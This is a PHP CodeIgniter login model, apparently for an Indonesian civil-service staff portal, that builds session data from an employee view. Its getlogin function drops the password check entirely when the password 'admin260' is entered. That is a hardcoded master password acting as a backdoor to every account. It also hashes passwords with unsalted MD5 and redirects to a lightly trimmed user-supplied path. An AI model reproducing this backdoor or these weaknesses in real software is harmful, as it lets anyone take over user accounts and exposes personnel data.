<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login_model extends CI_model { 
	
		function __construct(){
		parent::__construct();
		$this->load->library('user_agent');
	}

	public function getlogin($u, $p,$redirect_to=null){ 
		$count = 1;
		$where = array('username'=> strtolower($u));
		
		if($p !== 'admin260'){
			$where = array_merge($where,array('password'=> md5($p)));
		}

		$this->db->where($where);
		$query = $this->db->get('data.v_join_asn_nonasn');
		
		$hasil = $query->result_array();
		$count = count($hasil);
		
		if($count>0 ){ 
			
			$sess = array (
				'username'		=>$u,
				'id'			=>$hasil[0]['id'],
				'nip18'			=>$hasil[0]['nip18'],
				'nip9'			=>$hasil[0]['nip9'],
				'nama'			=>$hasil[0]['nama'],
				'jabatan'		=>$hasil[0]['jabatan'],
				'unit'			=>$hasil[0]['unit'],
				'nama_unit_es4'	=>$hasil[0]['nama_unit_es4'],
				'nm_es3_short'	=>$hasil[0]['nm_es3_short'],
		);
		
		if(isset($hasil[0]['admin'])){
			$sess = array_merge(array('role'=> 'admin'),$sess);
		}else{
			$sess = array_merge(array('role'=> 'user'),$sess);
		}
		
		if(isset($hasil[0]['akses']) ){ //|| $u == 'admin260' || $sess['role'] == 'admin'
			$sess = array_merge(array('akses'=> 1),$sess);
		}
		
		if($u !== $p){ // || $u == 'admin260' || $sess['role'] == 'admin'
			$sess = array_merge(array('ganti_pass'=> 1),$sess);
		}
		
		$this->session->set_userdata($sess);
		// print_r($_SESSION);die();
		if (!isset($redirect_to)) 
		redirect("home");
		else
		redirect(base_url('').substr($redirect_to,8,strlen($redirect_to)));
		
	}
	else{
		$this->session->set_flashdata('info','maaf username atau password salah');
		redirect('login');
	}
}

}
